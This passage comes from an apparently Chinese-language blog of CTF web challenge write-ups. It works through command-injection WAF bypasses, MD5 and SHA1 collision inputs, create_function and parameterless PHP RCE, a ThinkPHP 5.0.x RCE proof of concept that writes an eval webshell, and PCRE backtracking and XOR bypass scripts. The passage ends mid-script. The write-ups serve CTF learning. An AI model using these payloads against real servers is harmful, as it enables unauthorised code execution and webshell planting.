src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170744618.png" alt="image-20231204170744618" /></p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><ul><li><a href="https://www.extrader.top/posts/4f9c9406/#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81">PHP无参数RCE | Extraderの博客</a></li><li><a href="http://www.manongjc.com/detail/58-fiksrlppxmnbcoi.html">【CTF竞赛】无参数RCE总结 - 码农教程 (manongjc.com)</a></li><li><a href="https://cjlusec.ldxk.edu.cn/2023/04/07/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8">原生类在反序列化中的利用</a></li><li><a href="https://forum.butian.net/index.php/share/926">一次对PHP正则绕过的思考历程</a></li><li><a href="https://www.bilibili.com/read/cv22995917/">【闲扯】PHP Serializable接口 - 哔哩哔哩 (bilibili.com)</a></li></ul><h2 id="swpuctf-2021-新生赛finalrce"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛finalrce"></a> [SWPUCTF 2021 新生赛]finalrce</h2><h3 id="无回显rce"><a class="markdownIt-Anchor" href="#无回显rce"></a> 无回显RCE</h3><p>话不多说直接上源代码 ↓</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析源代码可得出两个重点，一是有正则筛选黑名单，需要绕过WAF；二是命令执行函数为<code>exec()</code>，该函数无回显，也就是说我们不知道命令执行的结果。</p><p>关于无回显RCE问题，其实网上也有丰富的学习资料。比如利用<code>nc</code>等指令将数据外带到VPS上等。</p><p>但是这道题的WAF过滤了诸多字段，包括<code>nc</code>在内的大部分指令都被禁用了。于是经过资料查询，我们可以使用<code>tee</code>指令。</p><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。更具体的资料可以查看菜鸟教程<a href="https://www.runoob.com/linux/linux-comm-tee.html">Linux tee命令 | 菜鸟教程 (runoob.com)</a>。</p><p>于是我们可以构造payload<code>http://node4.anna.nssctf.cn:28125/?url=l''s |tee 1.txt</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112002684.png" alt="image-20240221112002684" /></p><p>可以看到这里我们利用了<code>''</code>绕过了WAF，并且将内容输出到了1.txt文件。此时我们切换到<code>http://node4.anna.nssctf.cn:28125/1.txt</code>去查看文件。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112235705.png" alt="image-20240221112235705" /></p><p>写入成功，接下来我们就可以慢慢穿越目录找flag了。</p><p>最后使用exp<code>http://node4.anna.nssctf.cn:28125/?url=tac /flllll\aaaaaaggggggg|tee 1.txt</code>结束战斗。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112633338.png" alt="image-20240221112633338" /></p><p>得到flag<code>NSSCTF&#123;64645b91-933c-49ca-9a67-d54a6a253297&#125;</code>。</p><h3 id="参考-2"><a class="markdownIt-Anchor" href="#参考-2"></a> 参考</h3><ul><li><a href="https://blog.csdn.net/cosmoslin/article/details/123039067">【CTF】命令执行无回显利用_exec($cmd) 无回显-CSDN博客</a></li><li><a href="https://www.nssctf.cn/note/set/2564">文章 - 【SWPUCTF 2021 新生赛】finalrce Leaderchen的WriteUp | NSSCTF</a></li></ul><h2 id="nisactf-2022level-up"><a class="markdownIt-Anchor" href="#nisactf-2022level-up"></a> [NISACTF 2022]level-up</h2><p>这道题有多个level，所以我们一步步来复现。</p><p>首先进入环境。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181611748.png" alt="image-20240222181611748" /></p><p>noting here.</p><p>这肯定不对啊，打开源代码看看。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181741758.png" alt="image-20240222181741758" /></p><p>我靠这就是level1，赶紧套个小标题压压惊。</p><h3 id="level1"><a class="markdownIt-Anchor" href="#level1"></a> level1</h3><p>那么正式开始分析，这里的源代码<code>&lt;!-- disallow: --&gt;</code>暗示我们可能有源码泄露，于是我们访问一下<code>/robots.txt</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181924043.png" alt="image-20240222181924043" /></p><p>果然，于是我们访问<code>/level_2_1s_h3re.php</code>，移动到level2。</p><h3 id="level2"><a class="markdownIt-Anchor" href="#level2"></a> level2</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222182016334.png" alt="image-20240222182016334" /></p><p>一眼望过去又是PHP中的md5碰撞，不过这里是强碰撞，且进行了字符化处理，也就是说0e碰撞和数组绕过的特性失效了。看来是真的要输入两个碰撞的md5值，没什么好说的，上网查资料，果然有现成的exp，放在这里备用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>一顿操作后得到level3的路径。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183112065.png" alt="image-20240222183112065" /></p><p>访问<code>/Level___3.php</code>以移动到level3。</p><p>tips：最好使用burpsuite抓包发送，我用hackbar发送总是过不去，但是用burpsuite就没毛病……</p><h3 id="level3"><a class="markdownIt-Anchor" href="#level3"></a> level3</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183219619.png" alt="image-20240222183219619" /></p><p>同样的结构，只不过这次要求sha1碰撞，上网查exp，直接过。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183521462.png" alt="image-20240222183521462" /></p><p>成功得到level4路径，访问<code>/level_level_4.php</code>移动到level4。</p><h3 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183701902.png" alt="image-20240222183701902" /></p><p>这题有点意思。</p><p>明面上的思路就是以Get的方式发送变量名为<code>NI_SA_</code>值为<code>txw4ever</code>即可，即<code>http://node5.anna.nssctf.cn:28468/level_level_4.php?NI_SA_=txw4ever</code>。但是这么做的话，<code>$_SERVER['REQUEST_URI']</code>的值将变为<code>level_level_4.php?NI_SA_=txw4ever</code>，经过<code>parse_url()</code>处理后的<code>query</code>字段将为<code>NI_SA_</code>，而这恰好是在正则过滤黑名单中的，所以我们得绕过这个WAF。</p><p>这里就要说到一个特性，PHP会将请求参数中的非法字符替换为下划线，这里用<code>+</code>绕过，构造exp<code>/?NI+SA+=txw4ever</code>，可以得到level5的路径。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184653073.png" alt="image-20240222184653073" /></p><p>根据<code>55_5_55.php</code>移动到level5。</p><h3 id="level5"><a class="markdownIt-Anchor" href="#level5"></a> level5</h3><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184740573.png" alt="image-20240222184740573" /></p><p>终于进入正题，来到RCE环节。注意到<code>$a('',$b);</code>，考虑使用<code>create_function()</code>来进行RCE。</p><p>这里简单的介绍一下我对<code>create_function()</code>函数的理解，更详细的介绍可以移步参考部分。</p><p><code>create_function('字符串参数','字符串代码')</code>是一个PHP中用来创建匿名函数的函数，它接受两个字符串参数，第一个参数声明接受的形参，第二个参数用来描述函数的主体部分。以下是一个<code>create_function()</code>的使用范例。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return($a+$b)&#x27;</span>);</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$a</span>+<span class="variable">$b</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果第二个参数是可控的，那么我们就可以利用<code>create_function()</code>来完成命令执行，原理如下。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;$b&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;return &quot;ben is so handsome.&quot;&#125;;phpinfo();/*&#x27;</span>;</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="variable">$fun</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ben is so handsome&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">//有点类似于SQL注入，提前闭合中括号，命令执行，再把原有的中括号注释掉。</span></span><br></pre></td></tr></table></figure><p>同理，在这里我们也可以利用<code>create_function()</code>命令执行。令<code>$a=create_function</code>，<code>$b=&#125;;system('tac /f*');/*</code>构造exp。又因为存在WAF对<code>$a</code>的第一个字符进行过滤，捕捉任何字母和数字，所以我们还需要利用反斜杠进行绕过，即<code>$a=\create_funtion</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222190652192.png" alt="image-20240222190652192" /></p><p>得到flag，收工。</p><h3 id="参考-3"><a class="markdownIt-Anchor" href="#参考-3"></a> 参考</h3><ul><li><a href="https://blog.csdn.net/qq_38568388/article/details/78353449">$<em>SERVER【“REQUEST_URI”】函数</em>$_server【‘request_uri’】-CSDN博客</a></li><li><a href="https://baike.baidu.com/item/create_function/2535040?fr=ge_ala">create_function_百度百科 (baidu.com)</a></li><li><a href="https://zhuanlan.zhihu.com/p/377733114">CTF系列 PHP create_function的利用方式 - 知乎 (zhihu.com)</a></li></ul><h2 id="gxyctf-2019禁止套娃"><a class="markdownIt-Anchor" href="#gxyctf-2019禁止套娃"></a> [GXYCTF 2019]禁止套娃</h2><p>容器，启动！</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193409390.png" alt="image-20240222193409390" /></p><p>flag在哪里呢？</p><h3 id="git泄露"><a class="markdownIt-Anchor" href="#git泄露"></a> git泄露</h3><p>老规矩，看源码。但是源码也没有找到信息，那就只能老老实实开dirsearch扫描了。扫描过程中发现有<code>/.git/HEAD</code>等文件，猜测存在git泄露，用githack工具扫一遍，果然抓到了泄露的git包。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193643988.png" alt="image-20240222193643988" /></p><p>flag.php里没什么有用的信息，重要的是我们得到了index.php的源码。</p><h3 id="无参rce"><a class="markdownIt-Anchor" href="#无参rce"></a> 无参RCE</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出有一个敏感函数<code>@eval($_GET['exp']);</code>，但是前面有三层WAF。第一层WAF基本堵死了伪协议，第二层WAF递归正则要求exp不能含有参数，第三层WAF过滤了一些文件名（我也不知道它想干啥）。</p><p>这道题和<a href="#%E6%B9%96%E5%8D%97%E7%9C%81%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E9%82%80%E8%AF%B7%E5%A4%A7%E8%B5%9Bezrce">湖南省网络攻防邀请大赛ezrce</a>有异曲同工之妙，我们可以直接套它的exp<code>highlight_file(next(array_reverse(scandir(current(localeconv())))));</code>。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222194901564.png" alt="image-20240222194901564" /></p><p>果不其然直接就出了。</p><h3 id="参考-4"><a class="markdownIt-Anchor" href="#参考-4"></a> 参考</h3><p>见本章第一题。</p><h2 id="swpuctf-2022-新生赛ez_rce"><a class="markdownIt-Anchor" href="#swpuctf-2022-新生赛ez_rce"></a> [SWPUCTF 2022 新生赛]ez_rce</h2><h3 id="thinkphp模板注入"><a class="markdownIt-Anchor" href="#thinkphp模板注入"></a> ThinkPHP模板注入</h3><p>进入容器。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223194303034.png" alt="image-20240223194303034" /></p><p>真的什么都没有吗？（为什么RCE老喜欢藏着掖着）</p><p>看看源代码，一无所获。再看看robots.txt？果不其然，出现了提示。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195000028.png" alt="image-20240223195000028" /></p><p>于是我们访问<code>/NSS/index.php/</code>。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195046009.png" alt="image-20240223195046009" style="zoom:67%;" /><p>BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195215386.png" alt="image-20240223195215386" style="zoom:67%;" /><p>重点来了，题目环境的ThinkPHP框架版本为V5.0.22，而在版本5.0.0&lt;=5.0.23、5.1.0&lt;=5.1.30中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p><p>于是我们可以利用网络上的POC直接命令执行。</p><ol><li><p>查看<code>phpinfo()</code>页面：</p><p><code>/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</code></p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201242477.png" alt="image-20240223201242477" style="zoom: 50%;" /></li><li><p>执行系统命令：</p><p><code>/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201313443.png" alt="image-20240223201313443" style="zoom:50%;" /></li><li><p>写入<code>webshell</code>:</p><p><code>/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</code></p><p>这里写入一句话<code>&lt;?php @eval($_GET['shell']); ?&gt;</code>，编码后为</p><p><code>%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%47%45%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%20%3f%3e</code>。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201659922.png" alt="image-20240223201659922" style="zoom: 50%;" /><p>可以看到写入成功了，页面回显了数字31。</p></li><li><p>切换到webshell文件<code>/shell.php</code>，用蚁剑连接或者直接命令执行。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223202200614.png" alt="image-20240223202200614" style="zoom:50%;" /></li></ol><p>得到flag为<code>NSSCTF&#123;95bf8727-f275-4819-8377-cbc13dca39fe&#125;</code>。</p><h3 id="参考-5"><a class="markdownIt-Anchor" href="#参考-5"></a> 参考</h3><ul><li><a href="https://blog.csdn.net/xhwfa/article/details/124549004">【ThinkPHP5 5.0.22/5.1.29 RCE】_thinkphp 5.0.22/5.1.29 rce-CSDN博客</a></li></ul><h2 id="nisactf-2022middlerce"><a class="markdownIt-Anchor" href="#nisactf-2022middlerce"></a> [NISACTF 2022]middlerce</h2><h3 id="无字符rce"><a class="markdownIt-Anchor" href="#无字符rce"></a> 无字符RCE</h3><p>进入容器</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226095322389.png" alt="image-20240226095322389" /></p><p>进行审计，发现这里主要有两层WAF，一个是出现在题目中的正则表达式，还有一个是隐藏在<code>check.php</code>的<code>checkdata()</code>函数。</p><p>分析第一层WAF可知，该正则表达式筛掉了所有的特殊符号和数字、字母。这道题属于无字母RCE，可以利用PCRE回溯次数上限来进行绕过。而对于第二层不可见的WAF，则需要通过FUZZ的形式测试出可以使用的函数再绕过。</p><p>关于PCRE的原理，其实差不多就是注入大量脏数据污染正则筛选的数据，而preg_match的匹配存在回溯，回溯上限是1000000次，超过这个上限后函数会直接返回false。更加具体的原理可以参考P神的文章，会在后面贴出。</p><p>这里给出我在网上找到的一个攻击脚本，可以直接获取flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `tail /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;@&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://1.14.71.254:28939/&quot;</span>, data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100309756.png" alt="image-20240226100309756" /></p><p>顺带一提，还可以利用这个脚本查看<code>check.php</code>，可以看到这里过滤了大多数函数。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100407275.png" alt="image-20240226100407275" /></p><h3 id="参考-6"><a class="markdownIt-Anchor" href="#参考-6"></a> 参考</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)</a></li></ul><h2 id="hubuctf-2022-新生赛howtogetshell"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛howtogetshell"></a> [HUBUCTF 2022 新生赛]HowToGetShell</h2><h3 id="无字母rce"><a class="markdownIt-Anchor" href="#无字母rce"></a> 无字母RCE</h3><p>进入题目。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226170028085.png" alt="image-20240226170028085" /></p><p>十分的短小精悍，正则也是基本过滤了所有的字母，同样是无字母RCE，可以用异或或者取反的方法上传payload。</p><p>这里我们选择用异或绕过的方法解题，下面贴出一个异或的脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="built_in">input</span>(<span class="string">&quot;Input word:&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> word:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;!&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;c&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;#&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;$&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;e&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;%&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;f&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;g&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;\&#x27;&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;h&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;i&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;)&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;j&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;*&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;k&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;+&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;,&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;m&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;.&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;o&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;@&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;_&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;^&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;]&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;s&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;-&quot;^&quot;^&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;t&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;/&quot;^&quot;[&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;u&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;]&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;v&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;^&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;w&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;(&quot;^&quot;_&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;x&quot;</span>:</span><br><span class="line">        payload += <span class="string">&#x27;(&quot;&amp;&quot;^&quot;^&quot;).&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">        payload += <span 